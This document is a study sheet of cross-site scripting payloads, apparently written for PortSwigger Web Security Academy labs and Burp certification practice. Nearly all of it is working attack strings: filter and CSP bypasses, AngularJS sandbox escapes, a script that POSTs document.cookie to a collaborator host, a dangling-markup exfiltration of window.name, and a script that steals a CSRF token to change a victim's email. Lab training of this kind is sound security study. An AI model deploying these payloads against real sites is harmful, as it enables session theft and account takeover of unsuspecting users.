['https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/payloads/CookieStealer-Payloads.md'](Steal-cookie-payloads)

['https://portswigger.net/web-security/cross-site-scripting/cheat-sheet'](XSS Cheat sheet)
### test xss
```
jQuery selector sink using a hashchange event
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```
```
Reflected XSS into attribute with angle brackets HTML-encoded
"onmouseover="alert(1)
```
```
Stored XSS into anchor href attribute with double quotes HTML-encoded
href=javascript:alert(1)
```
```
Reflected XSS into a JavaScript string with angle brackets HTML encoded
'-alert(1)-'
```
```
DOM XSS in document.write sink using source location.search inside a select element
product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>
```
```
DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
HTML nodes containing the ng-app attribute
{{$on.constructor('alert(1)')()}}
```js
Reflected DOM XSS
\"-alert(1)}//
{"searchTerm":"\\"-alert(1)}//", "results":[]}
```
```
Stored DOM XSS (comment)
<><img src=1 onerror=alert(1)>
```
```
Reflected XSS into HTML context with most tags and attributes blocked
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```
```
Reflected XSS into HTML context with all tags blocked except custom ones
<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```
```
Reflected XSS with some SVG markup allowed
https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
```
```
Reflected XSS in canonical link tag
https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)
```
```
Reflected XSS into a JavaScript string with single quote and backslash escaped
</script><script>alert(1)</script>
```
```
Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
${alert(1)}
```
```
Exploiting cross-site scripting to steal cookies
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```
```
Exploiting XSS to bypass CSRF defenses
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
```
Reflected XSS with AngularJS sandbox escape without strings
https://YOUR-LAB-ID.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```
```
Reflected XSS with AngularJS sandbox escape and CSP
<script>
location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
</script>
```
```
Reflected XSS with event handlers and href attributes blocked
https://YOUR-LAB-ID.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E
```
```
Reflected XSS in a JavaScript URL with some characters blocked
https://YOUR-LAB-ID.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
```
```
Reflected XSS protected by very strict CSP, with dangling markup attack
<script>
if(window.name) {
		new Image().src='//BURP-COLLABORATOR-SUBDOMAIN?'+encodeURIComponent(window.name);
		} else {
     			location = 'https://YOUR-LAB-ID.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';
}
</script>
```
```
Reflected XSS protected by CSP, with CSP bypass
https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27
```